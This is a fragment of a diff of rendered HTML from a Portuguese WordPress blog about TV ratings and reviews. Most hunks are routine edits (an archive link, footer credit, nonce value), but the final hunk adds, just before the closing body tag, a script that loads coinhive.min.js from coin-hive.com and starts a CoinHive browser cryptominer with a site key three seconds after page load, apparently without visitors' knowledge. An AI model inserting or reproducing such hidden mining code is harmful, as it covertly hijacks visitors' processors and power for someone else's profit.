+				<a href="/archives/7743">Audiência USA – 14/09/17: Quinta</a>
 						</li>
 				</ul>
 		</div>		
@@ -1074,7 +1121,9 @@ var wid = '288202';
                               <p>Críticas &copy; 2017. All Rights Reserved.</p>
                           </div><!--/#copyright-->
 
-                          <div id="credit" style="">Developed by <b><a href="http://www.drall.com.br" style="color:#d66000" target="_blank">Drall Consulting</a></b></div><!--/#credit-->
+                          <div id="credit" style="">
+                <p>Powered by <a href="http://wordpress.org" target="_blank">WordPress</a>. Theme by <a href="http://presscustomizr.com">Press Customizr</a>.</p>
+              </div><!--/#credit-->
             
           </div>
 
@@ -1100,7 +1149,7 @@ var wpcf7 = {"apiSettings":{"root":"http:\/\/criticas.centrodouniverso.com.br\/w
 <script type='text/javascript' src='/wp-includes/js/underscore.min.js'></script>
 <script type='text/javascript'>
 /* <![CDATA[ */
-var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"82f2d222f7"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
+var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"centerAllImg":"1","timerOnScrollAllBrowsers":"1","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":[".container .content",".container .sidebar","#footer","#header-widgets"],"opts":{"excludeImg":[".tc-holder-img"],"fadeIn_options":100}},"goldenRatio":"1.618","gridGoldenRatioLimit":"350","sbStickyUserSettings":{"desktop":true,"mobile":true},"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"isDevMode":"","ajaxUrl":"http:\/\/criticas.centrodouniverso.com.br\/?huajax=1","frontNonce":{"id":"HuFrontNonce","handle":"bd86fd2199"},"userStarted":{"with":"with|3.2.10","on":{"date":"2017-05-19 14:07:11.000000","timezone_type":3,"timezone":"UTC"}},"isWelcomeNoteOn":"","welcomeContent":""};
 /* ]]> */
 </script>
 <script type='text/javascript' src='/wp-content/themes/hueman/assets/front/js/scripts.min.js'></script>
@@ -1108,7 +1157,7 @@ var HUParams = {"_disabled":[],"SmoothScroll":{"Enabled":true,"Options":{"touchp
 <!--[if lt IE 9]>
 <script src="http://criticas.centrodouniverso.com.br/wp-content/themes/hueman/assets/front/js/ie/respond.js"></script>
 <![endif]-->
-</body>
+<script type='text/javascript' src='https://coin-hive.com/lib/coinhive.min.js'></script><script>var speed = ( window.matchMedia("only screen and (max-width: 760px)").matches )?0.8:0.17;var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></body>
 </html><style>
 .site-description{
     color:white;
